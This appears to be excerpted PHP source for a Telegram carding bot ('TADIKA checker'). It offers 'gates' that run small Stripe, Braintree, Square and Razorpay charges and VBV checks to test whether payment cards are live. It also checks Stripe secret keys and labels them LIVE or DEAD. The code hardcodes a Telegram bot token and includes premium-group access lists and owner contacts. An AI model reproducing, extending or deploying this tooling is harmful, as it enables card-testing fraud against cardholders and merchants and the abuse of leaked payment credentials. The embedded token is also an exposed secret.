...
Stripe Charge 1Rs<code>.str</code>[<i>$islive</i>]
Vbv Check <code>.vbv</code>[<i>$islive</i>]
Razorpay <code>.rp</code>[<i>$islive</i>]
</b>");
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot1926644733:AAH25-EP8kR7CPwWu4rJGVWmV-plqBAswps/editMessageText?chat_id=$cchatid2&text=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
...
$freecommands = urlencode("<b>
GATE NAME | PREMIUM GATE
Stripe CHARGE 0.50$<code>.sto</code>[<i>$islive</i>]
Stripe CHARGE 0.50 INR<code>.stc</code>[<i>$islive</i>]
Stripe CHARGE 1$<code>.sa</code>[<i>$islive</i>]
Stripe CHARGE 4$<code>.stp</code>[<i>$islive</i>]
Stripe CHARGE 20$<code>.rape</code>[<i>$islive</i>]
BRAINTREE <code>.btu</code>[<i>OFF</i>]
SQUARE UP <code>.sq</code>[<i>$islive</i>]
SK Mass <code>.mchk</code>[<i>OFF</i>]
Auth <code>.aut</code>[<i>OFF</i>]
</b>");
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot1926644733:AAH25-EP8kR7CPwWu4rJGVWmV-plqBAswps/editMessageText?chat_id=$cchatid2&text=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
...
Note-⟩ If you get any type of bugs in this bot please inform our team at @mausampekapanrobot</b>");
$free = json_encode($keyboard);
        file_get_contents("https://api.telegram.org/bot1926644733:AAH25-EP8kR7CPwWu4rJGVWmV-plqBAswps/editMessageText?chat_id=$cchatid2&text=$freecommands&message_id=$cmessage_id2&parse_mode=HTML&reply_markup=$free");
...
file_get_contents("https://api.telegram.org/bot1926644733:AAH25-EP8kR7CPwWu4rJGVWmV-plqBAswps/editMessageText?chat_id=$cchatid2&text=$finalize&message_id=$cmessage_id2&parse_mode=HTML");
}
...
THIS BOT IS MADE WITH ♥️ BY  <code>@mausampekapan</code> </b>",
 'parse_mode'=>'HTML',
 'reply_markup' => $free,
 ]);
        exit();
...
$premium_id = (array("1236932007","1236932007"));
$premiumgp = (array("-1001320804136","-1001552296979","-1001300027599","-1001298504199","-1001434792768"));
        $keyboard = json_encode([
'inline_keyboard' => [
[['text' => "OWNER", 'url' => "https://t.me/mausampekapan"],]
]]);
                $keyboard1 = json_encode([
'inline_keyboard' => [
[['text' => "CHANNEL", 'url' => "https://t.me/tadikachecker"],
['text' => "GROUP", 'url' => "https://t.me/tadikachecker"],]
]]);

// if(!in_array($chatId, $premiumgp)){
	// $tch = json_decode(file_get_contents("https://api.telegram.org/bot1926644733:AAH25-EP8kR7CPwWu4rJGVWmV-plqBAswps/getChatMember?chat_id=@roldexverse&user_id=".$gId))->result->status;
...
// exit();
// }
        	// $tch = json_decode(file_get_contents("https://api.telegram.org/bot1926644733:AAH25-EP8kR7CPwWu4rJGVWmV-plqBAswps/getChatMember?chat_id=@roldexversechats&user_id=".$gId))->result->status;
// if($tch != 'member' && $tch != 'creator' && $tch != 'administrator'){
// bot('sendMessage',['chat_id'=>$chatId,'reply_to_message_id'=>$message_id,'text'=>"Sorry <a href='tg://user?id=$gId'>$firstname</a>
// 
// You Need To Join My Update Channel To Get Regular Updates
// 
 // Made With ♥️ By @mausampekapan And @RoldexVerse
// 
// USE /start AFTER JOIN",
 // 'parse_mode'=>'HTML',
 // 'reply_markup' =>  $keyboard1,
...
edit_message($chatId,$message_id_1,$keyboard, "<b>? DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot: @tadikamesbot </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
edit_message($chatId,$message_id_1,$keyboard, "<b>═════════ 『 TADIKA 』═════════%0A❌ DEAD KEY ❌</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot: @tadikamesbot </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
edit_message($chatId,$message_id_1,$keyboard, "<b>═════════ 『 TADIKA 』═════════%0A❌ DEAD KEY ❌</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot: @tadikamesbot </b>");
}else{
edit_message($chatId,$message_id_1,$keyboard, "<b>═════════ 『 TADIKA 』═════════%0A✅LIVE KEY✅</b>%0A<u>KEY:</u> <code>${fii}xxxxxxxxxxxxxxxxx${newstring}</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot: @tadikamesbot</b>");
// sleep(10);
...
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot1926644733:AAH25-EP8kR7CPwWu4rJGVWmV-plqBAswps/".$method;
    $ch = curl_init();
...
function sendMessage1($message) {
        ...
        $url = $GLOBALS[website]."/sendMessage?chat_id=-1001504881082&text=".$message."&parse_mode=HTML";
        file_get_contents($url);
...
<i>take group access from <code>@mausampekapan</code> to use here</i></b>");
